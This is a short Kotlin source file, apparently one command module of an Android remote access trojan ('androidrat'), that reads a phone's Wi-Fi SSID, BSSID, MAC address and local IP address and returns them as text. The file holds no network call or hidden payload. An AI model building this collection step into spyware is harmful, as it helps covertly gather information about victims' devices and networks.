package com.nqmgaming.androidrat.command

import android.content.Context
import android.net.wifi.WifiManager
import java.net.NetworkInterface
import java.util.Collections
import java.util.Locale

object IpAddress {
    private fun getIPAddress(useIPv4: Boolean): String? {
        return try {
            Collections.list(NetworkInterface.getNetworkInterfaces()).forEach { intf ->
                Collections.list(intf.inetAddresses).forEach { addr ->
                    if (!addr.isLoopbackAddress) {
                        val sAddr = addr.hostAddress
                        val isIPv4 = (sAddr?.indexOf(':') ?: 0) < 0
                        if (useIPv4) {
                            if (isIPv4) {
                                return sAddr
                            }
                        } else {
                            if (!isIPv4) {
                                val delim = sAddr?.indexOf('%')
                                if (sAddr != null) {
                                    if (delim != null) {
                                        return if (delim < 0) sAddr.uppercase() else sAddr.substring(0, delim).uppercase()
                                    }
                                }
                            }
                        }
                    }
                }
            }
            ""
        } catch (e: Exception) {
            ""
        }
    }

    fun getNetworkInfo(context: Context): String {
        val manager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val info = manager.connectionInfo
        return "SSID: ${info.ssid}\n" +
                "BSSID: ${info.bssid}\n" +
                "MAC: ${info.macAddress}\n" +
                "IP: ${getIPAddress(true)}"
    }
}